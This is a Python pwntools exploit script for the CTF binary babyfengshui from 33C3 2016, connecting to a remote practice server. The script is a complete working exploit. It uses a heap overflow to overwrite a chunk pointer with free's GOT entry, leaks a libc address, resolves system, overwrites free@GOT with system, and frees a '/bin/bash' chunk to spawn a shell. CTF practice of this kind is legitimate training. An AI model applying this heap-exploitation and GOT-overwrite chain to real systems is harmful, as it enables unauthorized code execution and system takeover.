from pwn import *
from LibcSearcher import *

elf = ELF('./babyfengshui_33c3_2016')
context.arch = 'i386'
# r = process(['../../libc/ld-2.23_86.so', './babyfengshui_33c3_2016'],
#             env={'LD_PRELOAD': '../../libc/libc-2.23_86.so'})
r = remote('node3.buuoj.cn', 27729)


def add(size1, name, size2, text):
    r.recvuntil('Action: ')
    r.sendline('0')
    r.recvuntil('size of description: ')
    r.sendline(str(size1))
    r.recvuntil('name: ')
    r.sendline(name)
    r.recvuntil('text length: ')
    r.sendline(str(size2))
    r.recvuntil('text: ')
    r.sendline(text)


def delete(index):
    r.recvuntil('Action: ')
    r.sendline('1')
    r.recvuntil('index: ')
    r.sendline(str(index))


def display(index):
    r.recvuntil('Action: ')
    r.sendline('2')
    r.recvuntil('index: ')
    r.sendline(str(index))


def update(index, size, text):
    r.recvuntil('Action: ')
    r.sendline('3')
    r.recvuntil('index: ')
    r.sendline(str(index))
    r.recvuntil('text length: ')
    r.sendline(str(size))
    r.recvuntil('text: ')
    r.sendline(text)


add(0x80, 'yyds', 4, 'yyds')
add(0x8, 'yyds', 4, 'yyds')
add(0x10, 'yyds', 10, '/bin/bash\x00')
delete(0)
add(0x108, 'yyds', 0x13C, 'a' * 0x108 + flat([0, 0x11, 0, 0, 0, 0x89, elf.got['free']]))
display(1)
r.recvuntil('description: ')
free_addr = u32(r.recv(4))
libc = LibcSearcher('free', free_addr)
libc_base = free_addr - libc.dump('free')
system_addr = libc_base + libc.dump('system')
update(1, 4, p32(system_addr))
delete(2)
r.interactive()
